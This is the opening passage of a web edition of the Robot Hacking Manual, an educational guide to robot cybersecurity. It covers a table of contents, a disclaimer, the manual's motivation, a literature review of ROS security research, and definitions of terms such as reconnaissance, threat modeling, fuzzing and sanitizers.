<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" >

<head>
  <meta charset="utf-8" />
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-E16HFC9TSD"></script>
  <script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
      dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', 'G-E16HFC9TSD');
  </script>
  <meta name="generator" content="pandoc-markdown-css-theme" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
    <meta name="author" content="Víctor Mayoral-Vilches" />
        <meta name="keywords" content="Robotics, Cybersecurity, Hacking, Pentesting, Offensive" />
      <title>RHM 0.4: Robot Hacking Manual</title>
    <link rel="stylesheet" href="css/theme.css" />
    <link rel="stylesheet" href="css/skylighting-solarized-theme.css" />
    <link rel="stylesheet" href="css/header__e6gvei.css" />
        
  </head>

<body>
  

  <header class="header-section global-section">
    <div class="__e6gvei_div __e6gvei header-wrap global-wrap global-flex">
      <div class="__e6gvei header-logo global-flex">
        <h1 class="__e6gvei no-logo"><a href="https://cybersecurityrobotics.net">Cybersecurity <br>Robotics</a></h1>
      </div>
      <div class="__e6gvei header-nav global-flex">
        <input id="toggle" type="checkbox">
        <label for="toggle" class="__e6gvei nav-label hamburger">
          <span class="__e6gvei hamburger-inner">
            <span class="__e6gvei hamburger-bar"></span>
            <span class="__e6gvei hamburger-bar"></span>
            <span class="__e6gvei hamburger-bar"></span>
          </span>
        </label>
        <div class="__e6gvei nav-toggle">
          <nav>
            <ul>
              <li class="__e6gvei nav-item-home">
                <a href="https://cybersecurityrobotics.net/" class="__e6gvei">Home</a>
              </li>
              <li class="__e6gvei nav-item-manual">
                <a href="https://rhm.cybersecurityrobotics.net/" class="__e6gvei is-active">Manual</a>
              </li>
              <li class="__e6gvei nav-item-resources">
                <a href="https://cybersecurityrobotics.net/resources/">Resources</a>
              </li>
              <li class="__e6gvei nav-item-contact">
                <a href="https://cybersecurityrobotics.net/contact/">Contact</a>
              </li>

              <li class="__e6gvei members-login-panel-section">
                <a class="__e6gvei members-signin" href="https://cybersecurityrobotics.net/signin/">Sign in</a>
                <a class="__e6gvei members-signup" href="https://cybersecurityrobotics.net/signup/">Sign up</a>
              </li>
            </ul>
          </nav>
        </div>
      </div>
    </div>

    <h1 class="title"><strong>RHM <code>0.4</code></strong>: Robot Hacking Manual</h1>
    <blockquote class="metadata">
            <p class="subtitle"><strong>From robotics to cybersecurity</strong>. Papers, notes and writeups from a journey into robot cybersecurity</p>
                  <p class="author">
                Víctor Mayoral-Vilches
              </p>
                  <p class="date before-toc"><time datetime="<strong>version <code>0.4</code></strong> (2021-12-12)"><strong>version <code>0.4</code></strong> (2021-12-12)</time></p>
          </blockquote>
  </header>

    <nav id="TOC" role="doc-toc">
        <strong>Contents</strong><label for="contents">⊕</label>
    <input type="checkbox" id="contents">
    <ul>
    <li><a href="#disclaimer">Disclaimer</a></li>
    <li><a href="#history">History</a></li>
    <li><a href="#motivation">Motivation</a></li>
    <li><a href="#a-containerized-approach">A containerized approach</a></li>
    <li><a href="#contribute-back">Contribute back</a></li>
    <li><a href="#pdf-versions">PDF versions</a></li>
    <li><a href="#introduction">Introduction</a>
    <ul>
    <li><a href="#about-robot-cybersecurity">About robot cybersecurity</a></li>
    <li><a href="#literature-review">Literature review</a></li>
    <li><a href="#terminology">Terminology</a>
    <ul>
    <li><a href="#robot-reconnaissance">Robot reconnaissance</a></li>
    <li><a href="#robot-threat-modeling">Robot Threat Modeling</a></li>
    <li><a href="#bugs-vulnerability-identification">Bugs &amp; vulnerability identification</a></li>
    <li><a href="#robot-exploitation">Robot exploitation</a></li>
    <li><a href="#robot-penetration-testing-rpt">Robot penetration testing (RPT)</a></li>
    <li><a href="#robot-red-teaming-rrt">Robot red teaming (RRT)</a></li>
    <li><a href="#robot-red-teaming">Robot red teaming</a></li>
    <li><a href="#other">Other</a></li>
    </ul></li>
    <li><a href="#comparing-robot-cybersecurity-with-it-ot-and-iot">Comparing robot cybersecurity with IT, OT and IoT</a>
    <ul>
    <li><a href="#introducing-some-common-terms">Introducing some common terms</a></li>
    <li><a href="#comparing-the-security-across-these-technologies">Comparing the security across these technologies</a></li>
    </ul></li>
    <li><a href="#understanding-the-robotics-supply-chain">Understanding the robotics supply chain</a>
    <ul>
    <li><a href="#stakeholders-of-the-robotics-supply-chain">Stakeholders of the robotics supply chain</a></li>
    <li><a href="#the-new-supply-chain-in-robotics">The ‘new’ supply chain in robotics</a></li>
    <li><a href="#so-whats-better-fragmentation-or-the-lack-of-it">So, what’s better, fragmentation or the lack of it?</a></li>
    </ul></li>
    <li><a href="#recommended-readings">Recommended readings</a></li>
    <li><a href="#recommended-talks">Recommended talks</a></li>
    </ul></li>
    <li><a href="#case-studies">Case studies</a>
    <ul>
    <li><a href="#universal-robot-ur3">Universal Robot UR3</a>
    <ul>
    <li><a href="#context">Context</a></li>
    <li><a href="#searching-for-flaws-in-the-rootfs">Searching for flaws in the rootfs</a></li>
    <li><a href="#vulnerabilities">Vulnerabilities</a></li>
    </ul></li>
    <li><a href="#mobile-industrial-robots-mir-100">Mobile Industrial Robots’ MiR-100</a>
    <ul>
    <li><a href="#reviewing-the-robots-file-system">Reviewing the robot’s file system</a></li>
    <li><a href="#footprinting-and-fingerprinting">Footprinting and fingerprinting</a></li>
    <li><a href="#vulnerabilities-1">Vulnerabilities</a></li>
    </ul></li>
    <li><a href="#robot-operating-system-ros-1">Robot Operating System (ROS 1)</a>
    <ul>
    <li><a href="#dissecting-ros-network-interactions-through-scapy">Dissecting ROS network interactions through scapy</a></li>
    <li><a href="#syn-ack-dos-flooding-attack-for-ros">SYN-ACK DoS flooding attack for ROS</a></li>
    <li><a href="#fin-ack-flood-attack-targeting-ros">FIN-ACK flood attack targeting ROS</a></li>
    </ul></li>
    <li><a href="#robot-operating-system-ros-2">Robot Operating System (ROS) 2</a>
    <ul>
    <li><a href="#dissecting-ros-2-network-interactions-through-rtps">Dissecting ROS 2 network interactions through RTPS</a></li>
    <li><a href="#dockerizing-the-target-environment">Dockerizing the target environment</a></li>
    <li><a href="#ros-2-reconnaissance">ROS 2 reconnaissance</a></li>
    <li><a href="#ros-2-reflection-attack">ROS 2 reflection attack</a></li>
    <li><a href="#ros-2-node-crashing">ROS 2 Node crashing</a></li>
    <li><a href="#credit">Credit</a></li>
    </ul></li>
    <li><a href="#turtlebot-3-tb3">TurtleBot 3 (TB3)</a>
    <ul>
    <li><a href="#dockerized-environment">Dockerized environment</a></li>
    <li><a href="#searching-for-tb3s-around-reconnaissance">Searching for TB3s around (reconnaissance)</a></li>
    <li><a href="#messing-up-with-tb3s-traffic">Messing up with TB3’s traffic</a></li>
    <li><a href="#crashing-tb3s-running-best-in-the-world-dds-rti-connext">Crashing TB3s running “best in the world” DDS: RTI Connext</a></li>
    <li><a href="#crashing-a-simple-ros-2-node-with-rtis-connext-dds">Crashing a simple ROS 2 Node with RTI’s Connext DDS</a></li>
    <li><a href="#credit-1">Credit</a></li>
    </ul></li>
    <li><a href="#robot-operating-system-ros-1-1">Robot Operating System (ROS 1)</a>
    <ul>
    <li><a href="#dissecting-ros-network-interactions-through-scapy-1">Dissecting ROS network interactions through scapy</a></li>
    <li><a href="#syn-ack-dos-flooding-attack-for-ros-1">SYN-ACK DoS flooding attack for ROS</a></li>
    <li><a href="#fin-ack-flood-attack-targeting-ros-1">FIN-ACK flood attack targeting ROS</a></li>
    </ul></li>
    <li><a href="#px4-autopilot">PX4 autopilot</a>
    <ul>
    <li><a href="#understanding-the-threat-landscape">Understanding the threat landscape</a></li>
    <li><a href="#static-analysis-of-px4-autopilot">Static analysis of PX4 autopilot</a></li>
    <li><a href="#a-simulated-drone-for-security-research-purposes">A simulated drone for security research purposes</a></li>
    </ul></li>
    </ul></li>
    <li><a href="#reconnaissance">Reconnaissance</a>
    <ul>
    <li><a href="#footprinting-ros-systems">Footprinting ROS systems</a>
    <ul>
    <li><a href="#ros-footprinting-basics">ROS footprinting basics</a></li>
    <li><a href="#checking-for-all-ros-instances-in-a-machine">Checking for all ROS instances in a machine</a></li>
    <li><a href="#resources">Resources</a></li>
    </ul></li>
    <li><a href="#footprinting-secure-ros-systems">Footprinting Secure ROS systems</a>
    <ul>
    <li><a href="#understanding-sros">Understanding SROS</a></li>
    <li><a href="#footprinting-sros-systems">Footprinting SROS systems</a></li>
    <li><a href="#resources-1">Resources</a></li>
    </ul></li>
    </ul></li>
    <li><a href="#robot-vulnerabilities">Robot vulnerabilities</a>
    <ul>
    <li><a href="#robot-sanitizers-in-ros-2-dashing">Robot sanitizers in ROS 2 Dashing</a>
    <ul>
    <li><a href="#os-x">OS X</a></li>
    <li><a href="#setup">Setup</a></li>
    <li><a href="#docker">Docker</a></li>
    <li><a href="#analyzing-results">Analyzing results</a></li>
    <li><a href="#looking-for-bugs-and-vulnerabilities-with-threadsanitizer-tsan">Looking for bugs and vulnerabilities with ThreadSanitizer (TSan)</a></li>
    <li><a href="#resources-2">Resources</a></li>
    </ul></li>
    <li><a href="#robot-sanitizers-in-moveit-2">Robot sanitizers in MoveIt 2</a>
    <ul>
    <li><a href="#looking-for-bugs-and-vulnerabilities-in-moveit-2-with-addresssanitizer-asan">Looking for bugs and vulnerabilities in MoveIt 2 with AddressSanitizer (ASan)</a></li>
    <li><a href="#looking-for-bugs-and-vulnerabilities-in-moveit-2-with-threadsanitizer-tsan">Looking for bugs and vulnerabilities in MoveIt 2 with ThreadSanitizer (TSan)</a></li>
    <li><a href="#resources-3">Resources</a></li>
    </ul></li>
    <li><a href="#debugging-output-of-robot-sanitizers-with-gdb-hunting-and-fixing-bugs">Debugging output of robot sanitizers with GDB, hunting and fixing bugs</a>
    <ul>
    <li><a href="#fetch-the-bugs">Fetch the bugs</a></li>
    <li><a href="#gaining-some-additional-understanding">Gaining some additional understanding</a></li>
    <li><a href="#getting-ready-to-debug">Getting ready to debug</a></li>
    <li><a href="#using-gdb-to-understand-better-the-leak">Using GDB to understand better the leak</a></li>
    <li><a href="#resources-4">Resources</a></li>
    </ul></li>
    <li><a href="#robot-sanitizers-with-gazebo">Robot sanitizers with Gazebo</a>
    <ul>
    <li><a href="#resources-5">Resources</a></li>
    </ul></li>
    <li><a href="#static-analysis-of-pyrobot">Static analysis of PyRobot</a>
    <ul>
    <li><a href="#discussing-pyrobot">Discussing PyRobot</a></li>
    <li><a href="#resources-6">Resources</a></li>
    </ul></li>
    <li><a href="#tutorial-6-looking-for-vulnerabilities-in-ros-2">Tutorial 6: Looking for vulnerabilities in ROS 2</a>
    <ul>
    <li><a href="#reconnaissance-1">Reconnaissance</a></li>
    <li><a href="#testing">Testing</a></li>
    <li><a href="#exploitation">Exploitation</a></li>
    <li><a href="#mitigation-or-remediation">Mitigation or remediation</a></li>
    </ul></li>
    <li><a href="#resources-7">Resources</a></li>
    <li><a href="#wip-tutorial-7-analyzing-turtlebot-3">WIP: Tutorial 7: Analyzing Turtlebot 3</a>
    <ul>
    <li><a href="#background-on-sros-2">Background on SROS 2</a></li>
    <li><a href="#resources-and-exploring-ros-2-setup-for-tb3">Resources and exploring ROS 2 setup for TB3</a></li>
    <li><a href="#resources-8">Resources</a></li>
    </ul></li>
    </ul></li>
    <li><a href="#robot-exploitation-1">Robot exploitation</a>
    <ul>
    <li><a href="#buffer-overflows">Buffer overflows</a>
    <ul>
    <li><a href="#analyzing-the-memory">Analyzing the memory</a></li>
    <li><a href="#resources-9">Resources</a></li>
    </ul></li>
    <li><a href="#building-shellcode">Building shellcode</a>
    <ul>
    <li><a href="#resources-10">Resources</a></li>
    </ul></li>
    <li><a href="#exploiting">Exploiting</a>
    <ul>
    <li><a href="#resources-11">Resources</a></li>
    </ul></li>
    <li><a href="#return-to-libc">Return to <code>libc</code></a>
    <ul>
    <li><a href="#finding-a-vulnerability-a-simple-overflow">Finding a vulnerability, a simple overflow</a></li>
    <li><a href="#playing-with-arguments">Playing with arguments</a></li>
    <li><a href="#return-to-libc-attack">Return to <code>libc</code> attack</a></li>
    <li><a href="#resources-12">Resources</a></li>
    </ul></li>
    <li><a href="#return-oriented-programming-rop">Return-Oriented Programming (ROP)</a></li>
    <li><a href="#remote-shell">Remote shell</a>
    <ul>
    <li><a href="#the-client">The client</a></li>
    <li><a href="#the-server">The server</a></li>
    <li><a href="#direct-remote-shell">Direct Remote Shell</a></li>
    <li><a href="#reverse-remote-shells">Reverse Remote Shells</a></li>
    <li><a href="#encrypted-remote-shell">Encrypted remote shell</a></li>
    <li><a href="#remote-shell-through-icmp">Remote shell through ICMP</a></li>
    <li><a href="#resources-13">Resources</a></li>
    </ul></li>
    <li><a href="#pwntools---ctf-toolkit">pwntools - CTF toolkit</a>
    <ul>
    <li><a href="#assembly-and-elf-manipulation">Assembly and ELF manipulation</a></li>
    <li><a href="#shellcode-from-assembly">Shellcode from assembly</a></li>
    <li><a href="#shellcraft">Shellcraft</a></li>
    <li><a href="#gdb-integration">GDB integration</a></li>
    <li><a href="#examples">Examples</a></li>
    <li><a href="#resources-14">Resources</a></li>
    </ul></li>
    <li><a href="#wip-linux-binary-protections">WIP: Linux Binary Protections</a>
    <ul>
    <li><a href="#resources-15">Resources</a></li>
    </ul></li>
    <li><a href="#building-a-pwnbox">Building a pwnbox</a>
    <ul>
    <li><a href="#resources-16">Resources</a></li>
    </ul></li>
    <li><a href="#wip-bypassing-nx-with-return-oriented-programming">WIP: Bypassing NX with Return Oriented Programming</a>
    <ul>
    <li><a href="#resources-17">Resources</a></li>
    </ul></li>
    <li><a href="#unauthenticated-registrationunregistration-with-ros-master-api">Unauthenticated registration/unregistration with ROS Master API</a>
    <ul>
    <li><a href="#unregistering-publisher-from-listener">Unregistering <code>/publisher</code> from <code>/listener</code></a></li>
    <li><a href="#resources-18">Resources</a></li>
    </ul></li>
    <li><a href="#unauthenticated-updates-in-publisher-list-for-specified-topic">Unauthenticated updates in publisher list for specified topic</a>
    <ul>
    <li><a href="#unregistering-publisher-from-listener-1">Unregistering <code>/publisher</code> from <code>/listener</code></a></li>
    <li><a href="#resources-19">Resources</a></li>
    </ul></li>
    <li><a href="#sockets-left-open-and-in-close_wait-state-in-ros-jade-distro-and-before">Sockets left open and in CLOSE_WAIT state in ROS (<code>Jade</code> distro and before)</a>
    <ul>
    <li><a href="#reproducing-the-flaw">Reproducing the flaw</a></li>
    <li><a href="#automating-the-exploitation">Automating the exploitation</a></li>
    <li><a href="#resources-20">Resources</a></li>
    </ul></li>
    </ul></li>
    <li><a href="#findings">Findings</a></li>
    <li><a href="#bibliography">Bibliography</a></li>
    </ul>
  </nav>
  
  <main>
    <!-- here goes the index -->
    <h1 id="disclaimer">Disclaimer</h1>
    <blockquote>
    <p><strong>The content provided in here is purely educational, unedited, unrelated to any institution, group or company and developed during my spare time. Use with care</strong>.</p>
    <p><em>By no means I want to encourage or promote the unauthorized tampering of robotic systems or related technologies. This can cause serious human harm and material damages</em>.</p>
    </blockquote>
    <h1 id="history">History</h1>
    <p>This project started back in early 2018 by <a href="https://www.linkedin.com/in/vmayoral">Víctor Mayoral-Vilches</a> as a series of independent markdown and Docker-based write-ups and has now converged into a manual that hopes help others enter the field of robot cybersecurity.</p>
    <h1 id="motivation">Motivation</h1>
    <p>Robots are often shipped insecure and in some cases fully unprotected. The rationale behind is fourfold: first, defensive security mechanisms for robots are still on their early stages, not covering the complete threat landscape. Second, the inherent complexity of robotic systems makes their protection costly, both technically and economically. Third, robot vendors do not generally take responsibility in a timely manner, extending the zero-days exposure window (time until mitigation of a zero-day) to several years on average. Fourth, contrary to the common-sense expectations in 21st century and similar to Ford in the 1920s with cars, most robot manufacturers oppose or difficult robot repairs. They employ planned obsolescence practices to discourage repairs and evade competition.</p>
    <p>Cybersecurity in robotics is crucial. Specially given the safety hazards that appear with robots (<strong>#nosafetywithoutsecurity</strong> in robotics). After observing for a few years how several manufacturers keep forwarding these problems to the end-users of these machines (their clients), this manual aims to empower robotics teams and security practitioners with the right knowhow to secure robots from an offensive perspective.</p>
    <h1 id="a-containerized-approach">A containerized approach</h1>
    <p>Robotics is the art of system integration. It’s a very engineering-oriented field where systematic reproduction of results is key for mitigation of security flaws. Docker containers are widely used throughout the manual while presenting PoCs to ensure that practitioners have a common, consistent and easily reproducible development environment. This facilitates the security process and the collaboration across teams.</p>
    <h1 id="contribute-back">Contribute back</h1>
    <p>Content’s made with an open and commercially friendly license so so that you can use it without asking at all. <strong>Don’t complain</strong>. If you have a suggestion, or feel you can add value to the existing content, open an <a href="issues">Issue</a> or a <a href="pulls">Pull Request</a>. If possible, contribute back.</p>
    <h1 id="pdf-versions">PDF versions</h1>
    <p>Download <a href="https://github.com/vmayoral/robot_hacking_manual/releases/download/0.4/RHM.pdf"><code>RHM v0.4</code></a>.</p>
    <p>PDF versions are generated for every release. Check out all the releases <a href="https://github.com/vmayoral/robot_hacking_manual/releases">here</a>:</p>
    <ul>
    <li><a href="https://github.com/vmayoral/robot_hacking_manual/releases/download/0.4/RHM.pdf"><code>RHM v0.4</code></a></li>
    <li><a href="https://github.com/vmayoral/robot_hacking_manual/releases/download/0.3/RHM.pdf"><code>RHM v0.3</code></a></li>
    </ul>
    <h1 id="introduction">Introduction</h1>
    <p>The <em>Robot Hacking Manual</em> (<code>RHM</code>) is an introductory series about cybersecurity for robots, with an attempt to provide comprehensive case studies and step-by-step tutorials with the intent to raise awareness in the field and highlight the importance of taking a <em>security-first</em><span class="sidenote-wrapper"><label for="sn-0" class="margin-toggle sidenote-number"></label><input type="checkbox" id="sn-0" class="margin-toggle"/><span class="sidenote">Read on what a security-first approach in <a href="https://www.darkreading.com/edge-articles/a-security-first-approach-to-devops">here</a>.<br />
    <br />
    </span></span> approach. The material available here is also a personal learning attempt and it’s disconnected from any particular organization. Content is provided as is and <strong>by no means I encourage or promote the unauthorized tampering of robotic systems or related technologies</strong>.</p>
    <h2 id="about-robot-cybersecurity">About robot cybersecurity</h2>
    <p>For the last fifty years, we have been witnessing the dawn of the robotics industry, but robots are not being created with security as a concern, often an indicator of a technology that still needs to mature. Security in robotics is often mistaken with safety. From industrial to consumer robots, going through professional ones, most of these machines are not resilient to security attacks. Manufacturers’ concerns, as well as existing standards, focus mainly on safety. Security is not being considered as a primary relevant matter.</p>
    <p>The integration between these two areas from a risk assessment perspective was first studied by <span class="citation" data-cites="1673343">Stoneburner (<a href="#ref-1673343" role="doc-biblioref">2006</a>)</span> and later discussed by <span class="citation" data-cites="kirschgens2018robot">Alzola-Kirschgens et al. (<a href="#ref-kirschgens2018robot" role="doc-biblioref">2018</a>)</span> which resulted in a unified security and safety risk framework. Commonly, robotics <em>safety is understood as developing protective mechanisms against accidents or malfunctions, whilst security is aimed to protect systems against risks posed by malicious actors</em> <span class="citation" data-cites="safetysecurity">Swinscow-Hall (<a href="#ref-safetysecurity" role="doc-biblioref">2017</a>)</span>. A slightly alternative view is the one that considers <strong>safety as protecting the environment from a given robot, whereas security is about protecting the robot from a given environment</strong>. In this manual we adopt the latter and refer the reader to <a href="https://cybersecurityrobotics.net/quality-safety-security-robotics/">https://cybersecurityrobotics.net/quality-safety-security-robotics/</a> for a more detailed literature review that introduces the differences and correlation between safety, security and quality in robotics.</p>
    <p>Security is <em>not a product, but a process</em> that needs to be continuously assessed in a periodic manner, as systems evolve and new cyber-threats are discovered. This becomes specially relevant with the increasing complexity of such systems as indicated by <span class="citation" data-cites="bozic2017planning">Bozic and Wotawa (<a href="#ref-bozic2017planning" role="doc-biblioref">2017</a>)</span>. Current robotic systems are of high complexity, a condition that in most cases leads to wide attack surfaces and a variety of potential attack vectors which makes difficult the use of traditional approaches.</p>
    <blockquote>
    <p><strong>Robotic systems and robots</strong> Both literature and practice are often vague when using the terms <code>robot</code>/s and/or <code>robotic system</code>/s. Sometimes these terms are used to refer to one of the robot components (e.g. the robot is the robot arm mechanics while its HMI is the <em>teach pendant</em>). Some other times, these terms are used to refer to the complete robot, including all its components, regardless of whether they are distributed or assembled into the same hull. Throughout this manual the latter is adopted and unless stated otherwise, the terms <code>robot</code>/s and/or <code>robotic system</code>/s will be used interchangeably to refer to the complete robotic system, including all its components.</p>
    </blockquote>
    <!-- To read more on how cybersecurity in robotics compares to IT, OT or IoT, refer to [this article](https://cybersecurityrobotics.net/it-ot-iot-and-robotics-security-comparison/). -->
    <h2 id="literature-review">Literature review</h2>
    <p>Arguably, the first installation of a cyber-physical system in a manufacturing plant was back in 1962 <span class="citation" data-cites="historyofrobotics">Robinson (<a href="#ref-historyofrobotics" role="doc-biblioref">2014</a>)</span>. The first human death caused by a robotic system is traced back to 1979 <span class="citation" data-cites="firstkiller">Young (<a href="#ref-firstkiller" role="doc-biblioref">2018</a>)</span> and the causes were safety-related according to the reports. From this point on, a series of actions involving agencies and corporations triggered to protect humans and environments from this machines, leading into safety standards.</p>
    <p>Security however hasn’t started being addressed in robotics until recently. Following after <span class="citation" data-cites="mcclean2013preliminary">McClean et al. (<a href="#ref-mcclean2013preliminary" role="doc-biblioref">2013</a>)</span> early assessment, in one of the first published articles on the topic <span class="citation" data-cites="lera2016ciberseguridad">Francisco Javier Rodrıguez Lera, Matellán, et al. (<a href="#ref-lera2016ciberseguridad" role="doc-biblioref">2016</a>)</span> already warns about the security dangers of the Robot Operating System (ROS) <span class="citation" data-cites="quigley2009ros">Quigley, Conley, et al. (<a href="#ref-quigley2009ros" role="doc-biblioref">2009</a>)</span>. Following from this publication, the same group in Spain authored a series of articles touching into robot cybersecurity <span class="citation" data-cites="lera2016cybersecurity lera2017cybersecurity guerrero2017empirical balsa2017cybersecurity rodriguez2018message">(<a href="#ref-lera2016cybersecurity" role="doc-biblioref">Francisco Javier Rodrıguez Lera, Balsa, et al. 2016</a>; <a href="#ref-lera2017cybersecurity" role="doc-biblioref">Francisco J. Rodrı́guez Lera et al. 2017</a>; <a href="#ref-guerrero2017empirical" role="doc-biblioref">Guerrero-Higueras et al. 2017</a>; <a href="#ref-balsa2017cybersecurity" role="doc-biblioref">Balsa-Comerón et al. 2017</a>; <a href="#ref-rodriguez2018message" role="doc-biblioref">Rodrı́guez-Lera et al. 2018</a>)</span>. Around the same time period, <span class="citation" data-cites="dieber2016application">Dieber et al. (<a href="#ref-dieber2016application" role="doc-biblioref">2016</a>)</span>} led a series of publications that researched cybersecurity in robotics proposing defensive blueprints for robots built around ROS <span class="citation" data-cites="Dieber:2017:SRO:3165321.3165569 dieber2017safety SecurecomROS taurer2018secure dieber2019security">(<a href="#ref-Dieber:2017:SRO:3165321.3165569" role="doc-biblioref">Dieber et al. 2017</a>; <a href="#ref-dieber2017safety" role="doc-biblioref">Dieber, Schlotzhauer, and Brandstötter 2017</a>; <a href="#ref-SecurecomROS" role="doc-biblioref">Breiling, Dieber, and Schartner 2017</a>; <a href="#ref-taurer2018secure" role="doc-biblioref">Taurer, Dieber, and Schartner 2018</a>; <a href="#ref-dieber2019security" role="doc-biblioref">Dieber and Breiling 2019</a>)</span>. Their work introduced additions to the ROS APIs to support modern cryptography and security measures. Contemporary to <span class="citation" data-cites="dieber2016application">Dieber et al. (<a href="#ref-dieber2016application" role="doc-biblioref">2016</a>)</span>’s work, <span class="citation" data-cites="white2016sros">White et al. (<a href="#ref-white2016sros" role="doc-biblioref">2016</a>)</span> also started delivering a series of articles <span class="citation" data-cites="caiazza2017security white2018procedurally white2019sros1 caiazza2019enhancing white2019network white2019black">(<a href="#ref-caiazza2017security" role="doc-biblioref">Caiazza 2017</a>; <a href="#ref-white2018procedurally" role="doc-biblioref">White et al. 2018</a>; <a href="#ref-white2019sros1" role="doc-biblioref">White, Caiazza, Christensen, et al. 2019</a>; <a href="#ref-caiazza2019enhancing" role="doc-biblioref">Caiazza, White, and Cortesi 2019</a>; <a href="#ref-white2019network" role="doc-biblioref">White, Caiazza, Jiang, et al. 2019</a>; <a href="#ref-white2019black" role="doc-biblioref">White, Caiazza, Cortesi, et al. 2019</a>)</span> proposing defensive mechanisms for ROS.</p>
    <p>A bit more than a year after that, starting in 2018, it’s possible to observe how more groups start showing interest for the field and contribute. <span class="citation" data-cites="vilches2018introducing">Vı́ctor Mayoral-Vilches, Kirschgens, Calvo, et al. (<a href="#ref-vilches2018introducing" role="doc-biblioref">2018</a>)</span> initiated a series of security research efforts attempting to define offensive security blueprints and methodologies in robotics that led to various contributions <span class="citation" data-cites="vilches2018volatile kirschgens2018robot mayoral2018aztarna mayoral2020alurity mayoral2020can lacava2020current mayoral2020devsecops mayoral2020industrial">(<a href="#ref-vilches2018volatile" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Kirschgens, Gil-Uriarte, et al. 2018</a>; <a href="#ref-kirschgens2018robot" role="doc-biblioref">Alzola-Kirschgens et al. 2018</a>; <a href="#ref-mayoral2018aztarna" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Mendia, et al. 2018</a>; <a href="#ref-mayoral2020alurity" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Abad-Fernández, et al. 2020</a>; <a href="#ref-mayoral2020can" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Pinzger, et al. 2020</a>; <a href="#ref-lacava2020current" role="doc-biblioref">Lacava et al. 2020</a>; <a href="#ref-mayoral2020devsecops" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Garcı́a-Maestro, et al. 2020</a>; <a href="#ref-mayoral2020industrial" role="doc-biblioref">Vı́ctor Mayoral-Vilches, Carbajo, and Gil-Uriarte 2020</a>)</span>. Most notably, this group released publicly a framework for conducting security assessments in robotics <span class="citation" data-cites="vilches2018introducing">Vı́ctor Mayoral-Vilches, Kirschgens, Calvo, et al. (<a href="#ref-vilches2018introducing" role="doc-biblioref">2018</a>)</span>, a vulnerability scoring mechanism for robots <span class="citation" data-cites="mayoral2018towardsRVSS">Mayoral Vilches et al. (<a href="#ref-mayoral2018towardsRVSS" role="doc-biblioref">2018</a>)</span>, a robotics Capture-The-Flag environment for robotics whereto learn how to train robot cybersecurity engineers <span class="citation" data-cites="mendia2018robotics">Mendia et al. (<a href="#ref-mendia2018robotics" role="doc-biblioref">2018</a>)</span> or a robot-specific vulnerability database that third parties could use to track their threat landscape <span class="citation" data-cites="mayoral2019introducing">Vı́ctor Mayoral-Vilches, Usategui San Juan, et al. (<a href="#ref-mayoral2019introducing" role="doc-biblioref">2019</a>)</span>, among others. In 2021, <span class="citation" data-cites="zhu2021cybersecurity">Zhu et al. (<a href="#ref-zhu2021cybersecurity" role="doc-biblioref">2021a</a>)</span> published a comprehensive introduction of this emerging topic for theoreticians and practitioners working in the field to foster a sub-community in robotics and allow more contributors to become part of the robot cybersecurity effort.</p>
    <h2 id="terminology">Terminology</h2>
    <h3 id="robot-reconnaissance">Robot reconnaissance</h3>
    <p>Reconnaissance is the act of gathering preliminary data or intelligence on your target. The data is gathered in order to better plan for your attack. Reconnaissance can be performed actively (meaning that you are directly touching the target) or passively (meaning that your recon is being performed through an intermediary).</p>
    <h4 id="robot-footprinting">Robot footprinting</h4>
    <p>Footprinting, (also known as <em>reconnaissance</em>) is the technique used for gathering information about digital systems and the entities they belong to.</p>
    <h3 id="robot-threat-modeling">Robot Threat Modeling</h3>
    <p>Threat modeling is the use of abstractions to aid in thinking about risks. The output of this activity is often named as the threat model. More commonly, a threat model enumerates the potential attackers, their capabilities and resources and their intended targets. In the context of robot cybersecurity, a threat model identifies security threats that apply to the robot and/or its components (both software and hardware) while providing means to address or mitigate them in the context of a use case.</p>
    <p>A threat model is key to a focused security defense and generally answers the following questions: - What are you building? - What can go wrong (from a security perspective)? - What should you do about those things that can go wrong? - Did you do a decent job analysing the system?</p>
    <h3 id="bugs-vulnerability-identification">Bugs &amp; vulnerability identification</h3>
    <h4 id="static-analysis">Static analysis</h4>
    <p>Static analysis means inspecting the code to look for faults. Static analysis is using a program (instead of a human) to inspect the code for faults.</p>
    <h4 id="dynamic-analysis">Dynamic analysis</h4>
    <p>Dynamic analysis, simply called “testing” as a rule, means executing the code while looking for errors and failures.</p>
    <h4 id="fuzzing">Fuzzing</h4>
    <p>Formally a sub-class of dynamic testing but we separated for convenience, fuzzing or fuzz testing implies challenging the security of your robotic software in a pseudo-automated manner providing invalid or random data as inputs wherever possible and looking for anomalous behaviors.</p>
    <h4 id="dynamic-analysis-sanitizers">Dynamic analysis (sanitizers)</h4>
    <p>Sanitizers are dynamic bug finding tools. Sanitizers analyze a single program excution and output a precise analysis result valid for that specific execution.</p>
    <details>
    <summary>
    More details about sanitizers
    </summary>
    <p>As explained at https://arxiv.org/pdf/1806.04355.pdf:</p>
    <blockquote>
    <p>sanitizers are similar to many well-known <em>exploit mitigations</em> in that both types of tools insert inlined reference monitors (IRMs) into the program to enforce a fine-grained security policy. Despite this similarity, however, exploit mitigations and sanitizers significantly differ in what they aim to achieve and how they are used</p>
    </blockquote>
    <p>The difference is better understood by the following table (also from the paper) that compares <code>exploit mitigations</code> and <code>sanitizers</code>:</p>
    <table>
    <thead>
    <tr class="header">
    <th></th>
    <th>Exploit Mitigations</th>
    <th>Sanitizers</th>
    </tr>
    </thead>
    <tbody>
    <tr class="odd">
    <td><strong>The goal is to …</strong></td>
    <td>Mitigate attacks</td>
    <td>Find vulnerabilities</td>
    </tr>
    <tr class="even">
    <td><strong>Used in …</strong></td>
    <td>Production</td>
    <td>Pre-release</td>
    </tr>
    <tr class="odd">
    <td><strong>Performance budget …</strong></td>
    <td>Very limited</td>
    <td>Much higher</td>
    </tr>
    <tr class="even">
    <td><strong>Policy violations lead to …</strong></td>
    <td>Program termination</td>
    <td>Problem diagnosis</td>
    </tr>
    <tr class="odd">
    <td><strong>Violations triggered at location of bug …</strong></td>
    <td>Sometimes</td>
    <td>Always</td>
